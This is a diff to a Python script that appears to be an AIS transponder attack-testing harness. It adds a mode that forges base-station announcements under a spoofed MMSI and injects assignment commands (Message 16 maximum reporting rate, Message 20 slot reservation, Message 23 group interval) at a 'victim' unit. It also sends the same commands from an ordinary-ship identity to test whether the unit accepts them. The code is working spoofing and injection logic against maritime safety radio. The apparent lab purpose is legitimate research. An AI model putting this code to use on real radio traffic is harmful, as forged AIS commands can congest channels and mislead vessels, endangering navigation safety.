@@ -726,6 +726,43 @@ def build_chanmgmt_switch(ctx):
     ]
 
 
+def build_chanmgmt_gentle(ctx):
+    """The base-station commands that do NOT change channels and do NOT lock a regional area --
+    M16 (rate), M20 (slots), M23 (group) -- so they all run in ONE clean pass with no position
+    jumping and no recovery needed. Built the same minimal way as the switch that worked: the base
+    is announced as its OWN step (re-announced before each group so it stays established), and each
+    command is sent ALONE, base then ship for the authority read. The unit stays on AIS1/AIS2
+    throughout, so nothing here can strand it."""
+    V = ctx.victim_mmsi
+    vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    def ann():
+        return ("cm_announce_base",
+                [(enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+                  "Msg4 base-station announcement")])
+    def m20b(src):
+        return [(enc.encode_type20(src, offset1=off, slots1=15, timeout1=7),
+                 f"M20 reserve slots {off}-{off+14}") for off in M20_TARGET_OFFSETS]
+    return [
+        ann(),
+        ("cm_m16_base",    [(enc.encode_type16(BASE_MMSI, V, offset_a=600, increment_a=0),
+                             "M16 (base) force MAX reporting rate 600/10min")]),
+        ("cm_m16_ship",    [(enc.encode_type16(REGULAR_MMSI, V, offset_a=600, increment_a=0),
+                             "M16 (ordinary ship) force MAX rate -- authority test")]),
+        ("cm_m16_release", [(enc.encode_type16(BASE_MMSI, V, offset_a=20, increment_a=0),
+                             "M16 (base) release rate (autonomous wins)")]),
+        ann(),
+        ("cm_m20_base",    m20b(BASE_MMSI)),
+        ("cm_m20_ship",    m20b(REGULAR_MMSI)),
+        ann(),
+        ("cm_m23_base",    [(_m23_group(BASE_MMSI, vlat, vlon, interval=11),
+                             "M23 (base) group slow reporting interval")]),
+        ("cm_m23_ship",    [(_m23_group(REGULAR_MMSI, vlat, vlon, interval=11),
+                             "M23 (ordinary ship) group slow -- authority test")]),
+        ("cm_m23_clear",   [(_m23_group(BASE_MMSI, vlat, vlon, interval=0),
+                             "M23 (base) clear group assignment")]),
+    ]
+
+
 # Frequency sweep targets: which channel numbers does a unit accept? 2087/2088 are the default
 # AIS pair and 2084/2085 are near-band AIS alternates; the interesting cases are the ones OUTSIDE
 # the AIS band (a unit that retunes there would emit AIS on a channel used for other VHF services)
@@ -977,6 +1014,10 @@ def main():
                          "ship then base), automatically clearing the regional area before each so "
                          "the unit's area-lock never blocks a later command. Long (~35-40 min) but "
                          "self-recovers the unit at the end. Recorder on AB throughout.")
+    ap.add_argument("--chanmgmt-gentle", action="store_true",
+                    help="run ONLY the non-channel base-station commands (M16 rate, M20 slots, M23 "
+                         "group), base then ship, in one clean pass -- no channel change, no "
+                         "position jumping, no stranding. Same minimal style as --chanmgmt-switch-only.")
     ap.add_argument("--chanmgmt-switch-only", action="store_true",
                     help="run ONLY the channel switch (announce + regional Msg 22 to the alt "
                          "channels, ship then base). The unit locks a regional area after the first "
@@ -1068,8 +1109,8 @@ def main():
     ctx = Ctx(args.victim_mmsi, gps)
     timeline = build_timeline(ctx)
     if (args.phase2_only or args.phase3_only or args.extras_only or args.chanmgmt_only
-            or args.chanmgmt_switch_only or args.chanmgmt_matrix or args.chanmgmt_sweep
-            or args.chanmgmt_recover or args.photo):
+            or args.chanmgmt_switch_only or args.chanmgmt_gentle or args.chanmgmt_matrix
+            or args.chanmgmt_sweep or args.chanmgmt_recover or args.photo):
         timeline = []
     if args.only:
         timeline = [(n, p) for (n, p) in timeline if n in args.only]
@@ -1206,6 +1247,36 @@ def main():
                     rec(event="serial_extra_end", name=name)
                     if i < len(sx) - 1:
                         time.sleep(args.gap)
+
+        # ---- gentle base-station commands (--chanmgmt-gentle): M16/M20/M23, no channel change ----
+        if args.chanmgmt_gentle:
+            cg = build_chanmgmt_gentle(ctx)
+            print("\n" + "=" * 72)
+            print("  GENTLE COMMANDS (M16 rate, M20 slots, M23 group). Recorder on AB. No channel")
+            print("  change, no jumping, nothing to strand -- the unit stays on AIS1/AIS2 throughout.")
+            print("=" * 72)
+            rec(event="chanmgmt_gentle_start", n=len(cg),
+                base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI)
+            # brief no-injection baseline so the M16/M23 rate effects are measured against it
+            rec(event="gentle_baseline_start", seconds=60)
+            print("    baseline: 60s, victim on AIS1/AIS2, no injection ...")
+            time.sleep(60)
+            rec(event="gentle_baseline_end")
+            for i, (name, payloads) in enumerate(cg):
+                src = "ship" if "ship" in name else "base"
+                if   "m20" in name: cmd = "M20"
+                elif "m16" in name: cmd = "M16"
+                elif "m23" in name: cmd = "M23"
+                else:               cmd = "announce"
+                fire(name, payloads, i, len(cg), tag="G:", extra={"command": cmd, "source": src})
+                if i < len(cg) - 1:
+                    short = name.endswith(("release", "clear")) or name == "cm_announce_base"
+                    time.sleep(8 if short else args.chanmgmt_gap)
+            rec(event="chanmgmt_gentle_end")
+            print("\n" + "!" * 72)
+            print("  GENTLE DONE. Unit stayed on AIS1/AIS2 (no recovery needed). Stop the recorders")
+            print("  and send the RF nmea, serial nmea, and manifest.")
+            print("!" * 72)
 
         # ---- channel-management / base-authority suite (--chanmgmt or --chanmgmt-only) ----
         if args.chanmgmt or args.chanmgmt_only or args.chanmgmt_switch_only:
